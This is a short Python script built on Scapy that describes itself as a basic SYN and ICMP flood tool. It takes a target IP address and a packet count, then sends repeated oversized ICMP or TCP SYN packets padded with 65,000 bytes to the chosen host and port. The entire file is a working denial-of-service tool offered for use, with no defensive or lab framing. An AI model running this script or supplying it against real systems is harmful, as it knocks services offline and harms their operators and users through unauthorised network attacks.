from scapy.all import *
import argparse


def argument_parser():
    """Allow user to specify target host and port."""
    parser = argparse.ArgumentParser(description="Basic SYN , ICMP flood script.")
    parser.add_argument("-H", "--host", help="Host IP address")
    parser.add_argument("-c", "--cycle", help="select how many times the packet is sent")

    var_args = vars(parser.parse_args())  # Convert argument namespace to dictionary
    print(var_args)
    return var_args


def icmp_flood(target: str , cycle: int, payload: int = 65000):
	ip = IP(dst=target)
	icmp = ICMP()
	raw = Raw(b"X" * payload)
	packet = ip / icmp / raw
	send(packet, count=cycle, verbose=0)
	print('send_ping(): Sent ' + str(cycle) + ' pings of ' + str(payload) + ' size to ' + target)


def syn_flood(target: str, cycle: int, dport: int,  payload: int = 65000):
	ip = IP(dst=target)
	tcp = TCP(dport= dport, flags= "S")
	raw = Raw(b"X" * payload)
	packet = ip / tcp / raw
	send(packet, count=cycle, verbose=0)
	print('send_syn(): Sent ' + str(cycle) + ' packets of ' + str(payload) + ' size to ' + target)


if __name__ == "__main__":
	try:
		user_args = argument_parser()
		host = str(user_args["host"])
		cycle = int(user_args["cycle"])

		flood_type = input("ICMP or SYN flood? ")

		if flood_type.lower() == "icmp": 
			icmp_flood(host, cycle)
		
		elif flood_type.lower() == "syn":
			dport= int(input("Enter Destination port: "))
			syn_flood(host, cycle, dport)
	
	except AttributeError:
		print("Error. Please provide the command-line arguments before running.")
